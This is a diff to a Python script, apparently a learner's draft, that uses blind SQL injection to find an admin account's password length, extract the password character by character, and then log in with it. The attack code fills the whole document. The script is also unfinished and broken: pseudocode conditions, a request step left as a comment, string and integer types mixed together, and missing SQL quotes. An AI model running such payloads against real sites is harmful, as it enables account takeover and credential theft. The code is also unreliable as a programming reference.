@@ -35,24 +35,46 @@ def main():
     char_is_capital = False
     char_is_small = False
 
-    sql_inject_statement = "' OR LENGTH ((SELECT password FROM users WHERE username = 'admin')) > 0"
+    known_username = "admin"
+    sql_inject_statement = f"' OR LENGTH ((SELECT password FROM users WHERE username = {known_username})) > 0"
     password_len = 0
-    password_extract = []
+    password_extract = ""
     for i in range(25):
-        sql_inject_statement = f"' OR LENGTH ((SELECT password FROM users WHERE username = 'admin')) > {i}"
+        sql_inject_statement = f"' OR LENGTH ((SELECT password FROM users WHERE username = {known_username})) > {i}"
         # send here the request if no user found continue, if invalid passowrd: save password len in varibale
-
+    # extract password char by char logic
     for i in range(password_len):
         # call function check_option
         if (check_option == "number"):
-            for j in range(10):
-                sql_inject_statement = f"' OR SUBSTRING ((SELECT password FROM users WHERE username = 'admin'), {i}, 1) = {j}"
+            for index in range(10):
+                sql_inject_statement = f"' OR SUBSTRING ((SELECT password FROM users WHERE username = {known_username}), {i}, 1) = {index}"
                 if (match):
-                    password_extract.append(j)
+                    password_extract += index
+                    break
         if(capital lettes):
-
-
-    #to extract password of username from table "users"
+            index = 'A'
+            while index <= 'Z':
+                sql_inject_statement = f"' OR SUBSTRING ((SELECT password FROM users WHERE username = {known_username}), {i}, 1) = {index}"
+                if (match):
+                    password_extract+=index
+                    break
+                index += 1 #increment current char ex: A + 1 = B and so on ..
+        if(small_letter):
+            index = 'a'
+            while index <= 'z':
+                sql_inject_statement = f"' OR SUBSTRING ((SELECT password FROM users WHERE username = {known_username}), {i}, 1) = {index}"
+                if (match):
+                    password_extract+=index
+                    break
+                index += 1  # increment current char ex: a + 1 = b and so on ..
+    #print the password extracted:
+    print(password_extract)
+    #try login now
+    status = post_request(URL, known_username, password_extract)
+    if status == 200:
+        print("Success!")
+    else:
+        print("Fail!!!!")
 
 if __name__ == "__main__":
     main()
